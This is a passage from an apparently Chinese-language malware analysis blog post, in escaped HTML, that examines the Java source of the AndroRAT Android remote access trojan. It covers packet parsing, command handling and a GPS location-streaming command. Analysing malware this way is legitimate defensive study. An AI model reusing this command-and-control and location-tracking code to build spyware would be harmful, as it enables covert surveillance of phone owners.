		&lt;span class=&quot;n&quot;&gt;reading&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;如果数据没有异常，则判断缓冲限制大小减去当前游标所在缓冲位置（即将要读取的数据）是否小于传输协议中包头的长度，如果小于（不符合协议），则返回。后面继续判断数据是否异常，如果存在，则使用TransportPacket类中的parseCompleter方法对数据进行读取操作，并将是否处理成功返回给partialDataExpected变量。如果数据没有异常，则实例化TransportPacket对象，并调用TransportPacket的parse方法对数据进行解析和读取数据body，最终头部信息有一个int作为totalLength、一个int作为localLength、一个byte作为lst、一个short作为NumSeq、一个int作为channel，其余部分作为body存储到一个byte数组当中（后面我们会具体的讲它们各个位的作用）。parse代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		

		&lt;span class=&quot;n&quot;&gt;totalLength&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;localLength&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;

		&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;NumSeq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getShort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;channel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/*
		System.out.println(&quot;Taille totale de la donn�e : &quot; + totalLength);
		System.out.println(&quot;Taille des donn�es du paquet : &quot; + localLength);
		System.out.println(&quot;Dernier paquet : &quot; + last);
		System.out.println(&quot;Position du paquet : &quot; + NumSeq);
		System.out.println(&quot;Canal:&quot; + channel);
		System.out.println(&quot;Recuperation de la donnee&quot;);
		*/&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// si la place restante dans le buffer est insuffisante&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;localLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			
			&lt;span class=&quot;n&quot;&gt;dataFilling&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;//System.out.println(&quot;une partie du packet a ete sauvegarde&quot;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; 
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;// s'il y a assez de place, on sauvegarde tout le paquet&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localLength&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们继续向下看receive最后的代码，判断数据是否异常，如果没有异常则调用controler（即Client）的Storage方法，将刚才处理数据的TransportPacket实例作为参数传递到Storage方法中。下面我们直接来看Storage的代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Storage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TransportPacket&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//!!!!!!!!!!!! Sinon on peut surement en valeur les arguments des command précédantes !&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			
			&lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;Bundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Bundle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putShort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;command&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getCommand&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putByteArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;arguments&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getArguments&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;putInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;chan&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getTargetChannel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;mess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendMessage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Androrat.Client.storage : pas une commande&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;		
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;先实例化一个CommandPacket对象，用它的parese方法解析数据，这回是解析数据的body部分，先看代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getShort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;targetChannel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;argument&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remaining&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()];&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argument&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;remaining&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;取body部分第一个short作为命令，取之后的一个int参数作为channel，剩下的内容作为参数。&lt;/p&gt;

&lt;p&gt;然后通过使用Message将内容传递到handler.sendMessage方法中，在这个方法中只有唯一的一个操作，就是调用processCommand处理参数中所带内容。而processCommand方法的操作是，调用在Client中定义的procCmd实例，执行它的process方法，参数顺序为，命令、参数、channel。process方法代码有些长，我们截取部分来看，代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arguments&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;wrap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GET_GPS_STREAM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;

			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;network&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gps&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;gps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GPSListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendInformation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Location request received&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Unknown provider '&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;provider&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;' for location&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* 省略部分代码 */&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commande&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;DISCONNECT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onDestroy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Command: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;commande&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; unknown&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码很简单，通过if和else if判断应执行哪一条命令，然后调用其中的具体操作。如果收到断开连接的命令，则调用Client的onDestroy方法来关闭连接。&lt;/p&gt;

&lt;h3 id=&quot;0x02-服务端发送指令格式&quot;&gt;0x02 服务端发送指令格式&lt;/h3&gt;

&lt;p&gt;我们以读取文件树的指令为例，来看指令结构：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-04/hexdata.png&quot; alt=&quot;datahex&quot; /&gt;&lt;/p&gt;

